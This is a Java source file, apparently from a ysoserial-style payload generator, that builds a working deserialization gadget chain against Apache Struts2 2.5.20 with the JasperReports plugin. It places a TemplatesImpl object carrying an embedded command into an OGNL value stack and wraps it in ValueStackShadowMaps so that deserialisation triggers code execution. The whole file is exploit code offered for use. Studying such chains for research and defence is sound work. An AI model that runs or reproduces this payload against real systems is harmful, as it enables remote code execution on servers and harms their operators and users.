package com.ppp.chain.others;

import com.opensymphony.xwork2.ActionContext;
import com.opensymphony.xwork2.TextProvider;
import com.opensymphony.xwork2.config.Configuration;
import com.opensymphony.xwork2.config.ConfigurationManager;
import com.opensymphony.xwork2.config.providers.XWorkConfigurationProvider;
import com.opensymphony.xwork2.conversion.impl.XWorkConverter;
import com.opensymphony.xwork2.inject.Container;
import com.opensymphony.xwork2.ognl.OgnlValueStack;
import com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor;
import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import org.apache.struts2.views.jasperreports.ValueStackShadowMap;

import java.lang.reflect.Constructor;
import java.util.HashMap;

/**
 * @author Whoopsunix
 */
@Dependencies({"org.apache.struts:struts2-core:2.5.20", "org.apache.struts:struts2-jasperreports-plugin:2.5.20"})
@Authors({Authors.SCICCONE})
@Sink({Sink.TemplatesImpl})
public class Struts2JasperReports implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
        initializeThreadLocalMockContainerForTesting();
        PayloadRunner.run(Struts2JasperReports.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        // create required objects via reflection
        Constructor<XWorkConverter> c1 = XWorkConverter.class.getDeclaredConstructor();
        Constructor<OgnlValueStack> c2 = OgnlValueStack.class.getDeclaredConstructor(
                XWorkConverter.class, CompoundRootAccessor.class, TextProvider.class, boolean.class);
        c1.setAccessible(true);
        c2.setAccessible(true);
        XWorkConverter xworkConverter = c1.newInstance();
        OgnlValueStack ognlValueStack = c2.newInstance(xworkConverter, new CompoundRootAccessor(), null, true);

        // inject templateImpl with embedded command
        ognlValueStack.set("template", templates);

        // create shadowMaps
        ValueStackShadowMap shadowMap1 = new ValueStackShadowMap(ognlValueStack);
        ValueStackShadowMap shadowMap2 = new ValueStackShadowMap(ognlValueStack);

        // execute OGNL "(template.newTransformer()) upon deserialisation
        String keyExpression = "(template.newTransformer())";
        shadowMap1.put(keyExpression, null);
        shadowMap2.put(keyExpression, null);

        return KickOff.makeMap(shadowMap1, shadowMap2);
    }

    /**
     * Create mock container and mock actionContext,
     * since a context is required for the payload being triggered upon deserialisation.
     * Simulates an Apache Struts2 app up and running.
     */
    public static void initializeThreadLocalMockContainerForTesting() {
        ConfigurationManager configurationManager = new ConfigurationManager(Container.DEFAULT_NAME);
        configurationManager.addContainerProvider(new XWorkConfigurationProvider());
        Configuration config = configurationManager.getConfiguration();
        Container container = config.getContainer();

        HashMap<String, Object> context = new HashMap<String, Object>();
        context.put(ActionContext.CONTAINER, container);
        ActionContext.setContext(new ActionContext(context));
    }
}
